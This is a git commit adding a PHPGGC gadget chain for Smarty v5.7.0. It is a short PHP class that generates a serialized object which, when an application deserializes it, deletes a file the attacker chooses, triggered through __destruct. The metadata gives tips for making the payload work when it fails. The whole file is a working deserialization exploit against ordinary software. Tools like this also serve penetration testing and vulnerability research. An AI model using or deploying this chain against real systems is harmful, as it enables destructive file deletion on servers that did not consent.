669223c2cbd336b130e46bdac2742fac516e2433
Reuben Seah <108401257+quirmz@users.noreply.github.com>
2026-02-05 15:27:53 +0800

    Add Smarty/FD/2/chain.php

---
+++ gadgetchains/Smarty/FD/2/chain.php
@@ -0,0 +1,21 @@
+<?php
+
+namespace GadgetChain\Smarty;
+
+class FD2 extends \PHPGGC\GadgetChain\FileDelete
+{
+    public static $version = 'v5.7.0';
+    public static $vector = '__destruct';
+    public static $author = 'quirmz';
+    public static $information = 'Updated version of Smarty/FD/1 that deletes a file. Generate gadget with \'-a\' flag. If the payload does not work, manually remove \'r:<int>\', replace it with a simple serialized string like \'s:1:"b"\' and try using the modified payload.';
+    public static $parameters = [
+        'remote_path'
+    ];
+
+    public function generate(array $parameters)
+    {
+        return new \Smarty\Template($parameters['remote_path']);
+    }
+}
+
+?>
